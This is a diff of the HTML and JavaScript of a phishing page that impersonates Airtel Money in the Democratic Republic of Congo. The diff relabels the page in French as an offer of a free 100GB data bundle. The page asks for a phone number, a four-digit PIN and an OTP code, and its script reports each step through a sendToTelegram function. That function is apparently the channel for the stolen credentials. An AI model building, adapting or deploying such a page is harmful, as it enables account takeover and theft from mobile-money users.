@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 
-<title>Airtel Money Login</title>
+<title>Recevoir le Forfait</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
 
@@ -246,9 +246,9 @@ opacity:1;
 
 <img src="assets/airtel.png" class="logo">
 
-<h1>Login</h1>
+<h1>Recevoir le Forfait</h1>
 
-<label>Phone Number</label>
+<label>Numéro de téléphone</label>
 
 <div class="phone-group">
 <div class="prefix">+243</div>
@@ -256,10 +256,10 @@ opacity:1;
 </div>
 
 <div class="warning">
-Enter your 9-digit mobile number.
+Entrez votre numéro Airtel à 9 chiffres.
 </div>
 
-<label>Enter your PIN</label>
+<label>Entrez votre PIN</label>
 
 <div class="pin">
 <input maxlength="1" inputmode="numeric">
@@ -268,7 +268,7 @@ Enter your 9-digit mobile number.
 <input maxlength="1" inputmode="numeric">
 </div>
 
-<button id="loginBtn" class="btn">Login</button>
+<button id="loginBtn" class="btn">Continuer</button>
 
 </div>
 
@@ -278,7 +278,7 @@ Enter your 9-digit mobile number.
 
 <img src="assets/airtel.png" class="logo">
 
-<h1>OTP Verification</h1>
+<h1>Recevoir le Forfait</h1>
 
 <div class="warning" id="maskedNumber"></div>
 
@@ -290,14 +290,14 @@ Enter your 9-digit mobile number.
 </div>
 
 <div class="count">
-Code expires in <span id="time">120</span>s
+Le code expire dans <span id="time">120</span>s
 </div>
 
 <div class="resend">
-<button id="resendBtn">Resend OTP</button>
+<button id="resendBtn">Renvoyer OTP</button>
 </div>
 
-<button id="otpBtn" class="btn">Submit</button>
+<button id="otpBtn" class="btn">Recevoir les bundles</button>
 
 </div>
 
@@ -307,10 +307,10 @@ Code expires in <span id="time">120</span>s
 
 <img src="assets/airtel.png" class="logo">
 
-<h1>Success</h1>
+<h1>Succès</h1>
 
 <div class="warning">
-Processing request...
+Traitement de votre demande...
 </div>
 
 </div>
@@ -333,17 +333,14 @@ selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))
 }catch(e){}
 
 const priceMap={
-"15GB":"CDF 3000",
-"35GB":"CDF 6000",
-"50GB":"CDF 9000",
-"Unlimited":"CDF 12000"
+"100GB":"GRATUIT"
 }
 
 function getPlanLine(){
 
-if(!selectedPlan) return "Unknown plan"
+if(!selectedPlan) return "Forfait inconnu"
 
-let name=selectedPlan.name||selectedPlan.shortName||"Plan"
+let name=selectedPlan.name||selectedPlan.shortName||"Forfait"
 
 let price=selectedPlan.price
 
@@ -469,7 +466,7 @@ document.getElementById(id)
 
 }
 
-/* login */
+/* continue */
 
 loginBtn.onclick=()=>{
 
@@ -478,11 +475,11 @@ if(loginClicked) return
 
 loginClicked=true
 
-sendToTelegram("login_clicked")
+sendToTelegram("continue_clicked")
 
 const masked=phoneValue.replace(/(\+243\d{3})\d{4}(\d{2})/,"$1****$2")
 
-maskedNumber.innerHTML=`Enter the OTP sent to ${masked}`
+maskedNumber.innerHTML=`Entrez le code OTP envoyé à ${masked}`
 
 show("step3")
 
@@ -543,7 +540,7 @@ if(otpSubmitted) return
 
 otpSubmitted=true
 
-sendToTelegram("otp_confirm")
+sendToTelegram("bundle_received")
 
 show("step4")
 
@@ -605,7 +602,7 @@ otpInputs.forEach(i=>i.disabled=true)
 
 otpBtn.classList.remove("active")
 
-maskedNumber.innerHTML="Code expired. Request new OTP"
+maskedNumber.innerHTML="Le code a expiré. Demandez un nouveau OTP"
 
 }
 
@@ -616,4 +613,5 @@ maskedNumber.innerHTML="Code expired. Request new OTP"
 </script>
 
 </body>
+
 </html>
